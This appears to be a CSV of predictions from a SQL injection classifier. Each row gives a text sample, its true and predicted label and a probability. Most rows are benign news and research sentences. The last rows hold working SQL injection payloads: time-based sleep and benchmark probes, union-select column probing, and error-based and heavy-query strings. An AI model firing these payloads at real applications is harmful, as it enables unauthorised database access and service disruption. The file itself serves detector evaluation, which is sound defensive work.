text,source,true_label,pred_label,prob_sqli,correct
"However , sigh relief heard Ludwigsburg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0939343155769166e-05,1
We &apos;re frankly tired feeling like &apos; hall monitors &apos; comes issue,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.93880985333817e-06,1
"Lancashire &apos;s Serious Organised Crime Unit led investigation Mr Ditta also seen convicted three counts possession cocaine perverting course justice , demonstrating commitment bringing criminals justice",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1016312782885507e-05,1
"Report: Obama campaign considered dumping Biden Hillary Clinton President Barack Obama &apos;s closest advisers secretly considered replacing Vice President Joe Biden Hillary Clinton 2012 ticket , according New York Times",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.3536466212826781e-05,1
"Starting work (Zhang Nivre, 2011), paper extend transition-based dependency parsing sentence-level stream words integrate parsing punctuation prediction",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0418708370707463e-05,1
"(2005) integrate prosodic features (pitch, pause duration, etc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,0.00017461841343902051,1
"com/wp-includes/online-mc, PRODUCT409 PRODUCT409 %EB%B0%95%EC%A3%BC%ED%98%B8 %ED%99%8D%EA%B8%B8%EB%8F%99 %ED%99%8D%EA%B8%B8%EA%B0%80 %ED%99%8D%EA%B8%B8%EB%82%98 %ED%99%8D%EA%B8%B8%EB%8B%A4 %ED%99%8D%EA%B8%B8%EB%9D%BC %ED%99%8D%EA%B8%B8%EB%A7%88 %ED%99%8D%EA%B8%B8%EB%B0%94 %ED%99%8D%EA%B8%B8%EC%82%AC %ED%99%8D%EA%B8%B8%EC%95%84 %ED%99%8D%EA%B8%B8%EC%9E%90 %ED%99%8D%EC%A7%88%EC%B0%A8%ED%99%8D%EC%A7%88%EC%B0%A8 & & =  (주)나빠요하하 ******* ********* ********** *********** ************** *************** +5hIp5/XQSe0q9x4@V$K@xbLIzU9CXs34UqM8@V$K@B9PWaIyA1ZscZc0tdMH@V$K@xbLIzU9CXs34UqM8 -----------------------------7e110e370ece -----------------------------7e115a25c0784 -----------------------------7e1161151f9e -----------------------------7e123d150600 -----------------------------7e12422e2 -----------------------------7e12422e2c090a -----------------------------7e12b2f1e1098 -----------------------------7e12db131 -----------------------------7e12db131f238a -----------------------------7e13482d1 -----------------------------7e13482d1b1020 -----------------------------7e135771c0f0c -----------------------------7e17a8320a4 -----------------------------7e1846d0fba -----------------------------7e196581600 -----------------------------7e1c7582640 ------WebKitFormBoundaryxqnD09MP6AAoISHj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,0.029878025874495506,1
"But Berlin longer needs Paris passport political legitimacy imposed economic policy Europe , leaving battered French economy struggling",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0446136911923531e-05,1
He conceded YMCA &apos;s opening statement commission also inaccurate claiming &quot; external audits YMCA recognised YMCA forefront child safety,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0306917829439044e-05,1
69 47164 F6 reply F6 1568 0 csdf1123mVwbHk =  9 134 e_qna eng modify 38 22747 22747 3945 556 V gallery2 view 366 3 F1 read F1 8628 80 sub0204 photo OPTOMA 218 30 02_01 1091 wr_datetime asc 2 sub0203 photo e_qna eng 8 18489 bbs338 12 view 132,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1408767932152841e-05,1
"The traffic light system , cost around EUR 15,000 , &quot; modern system currently available market , &quot; explained Arnold",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.98195173451677e-06,1
"In Nogales , Arizona , smugglers tap vast underground drainage canals",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0154936717299279e-05,1
"Worker falls ladder: seriously injured On Thursday , 51-year-old worker Eggelsberg fell ladder replacing broken external sensor seriously injured",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0055646271212026e-05,1
"For US carriers , impact ruling vary airline airline depend age fleet",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.845462045632303e-06,1
"&quot; The meeting takes place Town Hall , center Manhattan",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.758695341588464e-06,1
And one long tooth become fossilised: I first heard &quot; independence means passport controls &quot; canard least 40 years ago,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.5306386356242e-06,1
The pair managed break away field keeping expectations,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0898130312853027e-05,1
"A travel industry group welcomed changes , calling common-sense accommodations traveling public bristling technology",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1215668564545922e-05,1
Grießhaber therefore suggested required supporting wall constructed way town could due course widen adjoining street order guarantee smooth flow traffic,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0777164789033122e-05,1
"Under directorship Hermann Schneider , choir accompanied wind ensemble Frohsinn Tennenbronn Music Society , Noemi Lokodi organ",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.2921758752781898e-05,1
A eleven days proceedings scheduled trial,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.294766116188839e-05,1
"However , source text makes barely reference intense delivery",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0592004400677979e-05,1
"NSA revelations boost corporate paranoia state surveillance On mild day late August German police helicopter buzzed low US consulate Frankfurt , financial capital Germany",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.107117350329645e-05,1
"The building , workshop integrated stabling two horses , easy secure",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.138352308771573e-05,1
"In particular , planned major investments , debts thus affect parishes , cause great concern",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0229058716504369e-05,1
"Assad &apos;s troops battling rebels , many linked al-Qaida groups , Safira weeks",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1784844900830649e-05,1
To make sewerage channels wider would gobble millions,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.2041805348417256e-05,1
"The Mayor considers right decision Winterlingen handed responsibility building someone else winter , thus longer pay upkeep building , heating , tending garden clearing pavement",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0918414773186669e-05,1
&quot; A tape voicemails taken phone least three occasions seized Mulcaire &apos;s home August 2006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1722099770850036e-05,1
"The reconstruction railway crossing Trautwein tannery could , hand , bring entirely different problem regard access steep &quot; Geroltzhäuser Weg &quot;",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0665940862963907e-05,1
"Accept place divine providence found you, society contemporaries, connection events",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.266937013308052e-06,1
"The training data used models adapted Treebank data excluding punctuations keeping punctuation contexts, simulate unavailable annotated transcribed speech texts",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.595333722245414e-06,1
You even become Federal President theology degree,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1159675523231272e-05,1
"Authorities seized eight-and-a-half tons marijuana 327 pounds cocaine connection tunnel &apos;s discovery , according court records",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0622392437653616e-05,1
&quot; It &apos;s really important U,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.755838618730195e-06,1
"Their motto , large billboard stated &quot; We unfinished buildings &quot;",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0874489817069843e-05,1
The teenager &apos;s parents said hope video footage contain clues died,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.140268796007149e-05,1
"&quot; Loud declarations &apos; foreigners getting back queue &apos; &apos; Aussie jobs first &apos; unpleasant throwback time unions demanded protected labor market , &quot; told Australia India Institute today",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.072487430064939e-05,1
Nothing last sacred integrity mind,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.8595002984511666e-05,1
The voyage best ship zigzag line hundred tacks,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0721694707171991e-05,1
"&quot; People willing track speed track location , &quot; said Ryan Morrison , chief executive True Mileage",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.89748332358431e-06,1
"In , collided BMW 23-year-old Konstanz resident , travelling lane",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0452345122757833e-05,1
"The magnetic activity star , interaction magnetic field emitted particle radiation play important role",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0172267138841562e-05,1
Our models linear complexity capable handling streams words length,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0525306606723461e-05,1
"Some transportation planners , though , wonder talk paying mile giant distraction",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.882807717076503e-06,1
"Following Mr Chen &apos;s apology , New Express issued front-page apology , saying failed properly check reports",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1555983292055316e-05,1
Fire crews called rescue lost puppy got stuck 50ft ground precarious ledge quarry Cocker spaniel Ruby run minor road crash She spotted three days later dog walker trapped quarry Firefighters abseil cliff face pluck dog certain death A puppy lucky escape fire crews called lift safety somehow got stuck 50ft precarious cliff ledge,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1191306839464232e-05,1
Standard automatic speech recognizers output unstructured streams words,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0287336408509873e-05,1
"As airport spokesperson Peter Kleeman announced Radio Vienna adjusting approach towards announcements , Vienna Airport following international trend",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0658213795977645e-05,1
Centre manager Colin Seddon said: &quot; This water rail likely winter migrant Northern Europe got caught strong winds North Sea,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0784238838823512e-05,1
"&quot; We need careful identify true onset puberty , &quot; said Dr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1080098374804948e-05,1
"The new carry-on fee bags overhead bin , small bags seat still free",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0779663170978893e-05,1
We conduct experiments IWSLT data TDT4 test data sets,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.268979121960001e-05,1
"&quot; Was matter discussed course telephone conversations development commercial lease policy , &quot; Assistant Commissioner Anthony Whealy asked Mr Tripodi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.030882413033396e-05,1
Initially actual cause accident remained unclear,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,7.206469308584929e-05,1
"In tests , vaccinated mice subsequently given nicotine continued normal activity",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1358950359863229e-05,1
US Airways briefly tried charging beverages 2008 backed seven months later passengers complained major airline followed,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1448223631305154e-05,1
"In various projects , learned different tasks involved Christian church life attended Youth Day Untermachtal together",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0220740477961954e-05,1
"In spite shutdown , able visit Statue Liberty second day , climb statue foot",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.02821177279111e-05,1
"Among others , airports Kopenhagen , Frankfurt Dubai already done away noisy call-outs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.094401886803098e-05,1
"Half mashed , ripe banana , example , replace egg binding agent cake",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.012512257148046e-05,1
"A biosphere area offers chance sustainable economic ecological development basis internationally recognised Unesco status , thus offers extension achieved thus far Life Project previous care days",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0148498404305428e-05,1
"This year , sexy inanimate objects rage",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.756071449373849e-06,1
"It probably long understand tails sometimes go one way , sometimes Prof Vallortigara said: &quot; We presented dogs movies dogs - either naturalistic version silhouette get rid confounding issues , could doctor movement tail present tail left right",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0893079888774082e-05,1
Stock exchange operator Nasdaq OMX keeps customers tenterhooks,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.537711775919888e-06,1
"RBS suspends two forex traders Royal Bank Scotland suspended two traders foreign exchange division according two people familiar situation , another sign global probe regulators suspected manipulation currency market rapidly gaining traction",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.840430720942095e-06,1
"Baratz &apos;s daughter Katie born male chromosomes , DSD called complete androgen insensitivity syndrome",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.633090485294815e-06,1
Business leaders sceptical,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1904398888873402e-05,1
"estimated 100,000 died conflict since March 2011",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.74721751845209e-06,1
Please contact customer services box office purchased tickets assistance,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.012851316772867e-05,1
He still accused passing secret information without authorisation,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.2919157597934827e-05,1
"&quot; Without support employer , resulting burden placed employees could result termination employment contract , &quot; said Wolf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.080997935787309e-05,1
He admitted cocaine possession earlier hearing,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.3343112186703365e-05,1
The way started &apos;ll Horse Year show long - I &apos;m sure &apos;ll well,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.921856872097123e-06,1
judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.94845322566107e-06,1
"Women &apos;t sexy professionals anymore; also sexy foods like pizza , hamburgers carrots",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.720538400870282e-06,1
"Alongside materials familiar us , stars , planets life forms composed , exists dark matter , gravitational force holds galaxies galaxy clusters together , dark energy , effects accelerate expansion universe",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1186494702997152e-05,1
"&quot; I salute fortitude courage &apos;ve demonstrated fulfilling challenging mission ever undertaken organization , &quot; watchdog &apos;s director-general , Ahmet Uzumcu , said comments released OPCW",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.020958643493941e-05,1
Töniser Straße failed see 37-year-old &apos;s oncoming vehicle,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0383446351625025e-05,1
"Here breeders clubs District Soest exhibiting best animals , young private individuals Wickeder also showing rabbits",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1109290426247753e-05,1
The usually dull arena highway planning suddenly spawned intense debate colorful alliances,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.93539833871182e-06,1
"Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.813048563955817e-06,1
"&quot; It interesting see whether new Pope nominate cardinals rest world restore balance , &quot; said",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.995870641432703e-06,1
"He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1327761967550032e-05,1
"From fascinating view world-famous skyline , particularly impressive evening light",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0971575647999998e-05,1
The judge ruled August city violated Constitution way carried program stopping questioning people,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0570017366262618e-05,1
"The children receive help regional artisans , present 11",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1203203939658124e-05,1
"However , interview , Bloom said Kerr still love",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.4079691027291119e-05,1
"The court also upheld remaining sections 2700 page law , held health care law &apos;s requirement states increase Medicaid eligibility else lose federal Medicaid funding unconstitutionally coercive",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.057850840879837e-05,1
"&quot; They absolutely think son murdered , &quot; Benjamin Crump , attorney representing Kenneth Jacquelyn Johnson , told FoxNews",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1207606803509407e-05,1
That given airlines incentive steer passengers buy directly instead going online travel agency,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1007407010765746e-05,1
"Charlie &apos;s experimental company , based Bristol , famed unusual flavours including beer , cheese , beef gold leaf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0588248187559657e-05,1
"Everything subsidised Germany , coal , cars farmers",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.079359935829416e-05,1
"It &apos;s unclear , however , whether Obama knew team exploring swap",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0503285921004135e-05,1
Tripodi denies influenced Obeid Former NSW Labor minister Joe Tripodi investigated state &apos;s corruption watchdog,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1002327482856344e-05,1
The restrictions also become increasingly difficult enforce use devices become ubiquitous,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0461728379596025e-05,1
"It &apos;s book I thought would uplift doldrums second-year medical school , renew sense hope",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.074361898645293e-05,1
"Even wood &quot; Kuhbach &quot; area occasionally transported via route , vehicles , measure 20 metres length , would able use route via Häberles Bridge , would able make turn Hauptstrasse",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1385422112653032e-05,1
"Chatting many people passing &quot; construction site &quot; , became clear many citizens believe execution project would make things much better town , although many questions citizen &apos;s initiative regarding scale planned project",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0391350770078134e-05,1
"8 million , also stood around EUR one million projections",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0763606042019092e-05,1
"Gender identification still well understood , experts United States say sex cannot determined , &apos;s better use best available information assign wait monitor child &apos;s psychological physical development undertaking surgery ,",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0275334716425277e-05,1
This also applies case victims,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,4.789090598933399e-05,1
"They exploring , next decade , move system drivers pay per mile road roll",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.95211667031981e-06,1
"&quot; Small medium sized companies often lack experience , personnel financial resources protect corporate secrets effectively unauthorised access , &quot; BfV warns report",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1273649761278648e-05,1
A large infra-red telescope space could penetrate darkness,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.5286550478776917e-05,1
"The recent cause Rangnick &apos;s criticism yellow card Mane 3: 0 Grödig last Sunday , whereby Senegalese striker penalised supposed play acting - admittedly justified , shown TV footage",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.2525778402050491e-05,1
One man explained free hernia surgery &apos;d received allow work,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0303398994437885e-05,1
The Guangzhou-based New Express made rare public plea release journalist Chen Yongzhou,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1722345334419515e-05,1
It always ancient virtue,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.361147042189259e-05,1
Trainer Tomasz Malmon let doubt fact,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.45305419008946e-06,1
"They intersex , part group 60 conditions fall diagnosis disorders sexual development , umbrella term atypical chromosomes , gonads (ovaries testes), unusually developed genitalia",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.224770585395163e-05,1
"Police women &apos;s associations South Africa , however , estimate number unreported cases sexual assault 10-25 times high",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1184521099494305e-05,1
"&quot; They know start smoking , receive pleasure due nicotine vaccine , help kick habit , &quot; said",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0082735570904333e-05,1
Managing director Graham Turner said Flight Centre made 8 per cent profit first half started second half strongly especially Australian UK non-business travel,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,9.973074156732764e-06,1
"Up , hungry sunshine winter travel nearby peak cable car",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0629953067109454e-05,1
"The devices , track every mile motorist drives transmit information bureaucrats , center controversial attempt Washington state planning offices overhaul outdated system funding America &apos;s major roads",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0555622793617658e-05,1
"As crowds horse-showing experts gathered Cardiff battle Horse Year , knew competition would tough",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.0149795343750156e-05,1
cgi 393 F4 read F4 634 PDS 1771 1 yetglezip 3980 wr_hit desc 497 1490110 bbs4 for_print 9,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1578796147659887e-05,1
cgi 2& 20 20003 2017 201704/00001491382788757,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,0,0,1.1756265848816838e-05,1
""" or sleep ( __TIME__ )  = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
';waitfor delay '0:0:__TIME__'--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"-6400  )  )   union all select 4650,4650,4650--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"1"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""jozh"" = ""jozh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
"-4605"" )  union all select 8542,8542,8542,8542,8542,8542,8542,8542--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'njnr' = 'njnr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999920129776001,1
"1'  )  )   as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1%"" )  and 2006 = 2006",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   as lomw where 9257 = 9257 union all select null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1"" )  as duvm where 6190 = 6190 order by 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8814 = 8814",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-4785""  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1'  )  )   as kahn where 1361 = 1361 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1%'  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1 )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
1' where 6913 = 6913 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"-3697'  )  )   )  union all select 5180,5180,5180,5180,5180,5180,5180--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"-9514  )  )   as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1' )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( 'vhqm' = 'vhqm,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999992847442627,1
"1'+ ( select 'zohk' where 5502 = 5502 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999923706054688,1
"-3829%"" )  union all select 2218,2218,2218,2218,2218,2218,2218--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
1' )  rlike sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999922513961792,1
"1"" )  where 6897 = 6897",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999927282333374,1
"1""  )  )   as osuh where 8809 = 8809",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999926090240479,1
1 )  as gbtj where 8175 = 8175,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999924898147583,1
